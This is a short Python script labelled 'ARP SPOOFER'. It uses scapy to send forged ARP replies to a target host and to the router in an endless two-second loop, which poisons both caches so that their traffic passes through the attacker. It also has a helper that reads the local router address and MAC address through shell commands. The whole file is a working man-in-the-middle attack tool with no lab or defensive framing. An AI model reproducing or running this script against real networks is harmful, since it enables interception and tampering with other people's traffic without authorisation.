#!/usr/bin/env python3

import sys
import time
import signal
import argparse
import subprocess
import scapy.all as scapy
from termcolor import colored

def ctrl_exit(one, two):

    print(colored("[!] exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_exit)

def arguments():

    argument = argparse.ArgumentParser(description="ARP SPOOFER")
    argument.add_argument('-gir', '--get_ip_router', action='store_true', dest='ip_router', help='Know your IP router and your HWaddres')
    argument.add_argument('-i', '--ip', dest='ip', help='write the IP to spoof')
    argument.add_argument('-r', '--router', dest='router', help='Write your router IP')
    argument.add_argument('-hw', '--hwaddress', dest='hwaddress', help='Write yout HWaddress')

    return argument.parse_args()

def get_ip_router():

    command1 = "route -n | awk 'NR==3' | awk '{print $2}'"
    ip = subprocess.run(command1, shell=True, capture_output=True, text=True)

    command2 = "ifconfig | awk '/ether/' | awk '{print $2}'"
    HWadd = subprocess.run(command2, shell=True, capture_output=True, text=True)

    return ip.stdout.strip(), HWadd.stdout.strip()

def spoof(ip, ip_spoof, hws):

    spoofi = scapy.ARP(op=2, psrc=ip_spoof, pdst=ip, hwsrc=hws)
    scapy.send(spoofi, verbose=False)

def control_options(argm):

    if argm.ip_router:
        ip, hw = get_ip_router()
        print(colored(f"[+] IP-Router {ip}  HWaddress {hw}", "magenta"))
    else:
        while True:
            spoof(argm.router, argm.ip, argm.hwaddress)
            spoof(argm.ip, argm.router, argm.hwaddress)

            time.sleep(2)

def main():

    argument = arguments()
    control_options(argument)

if __name__ == "__main__":
    main()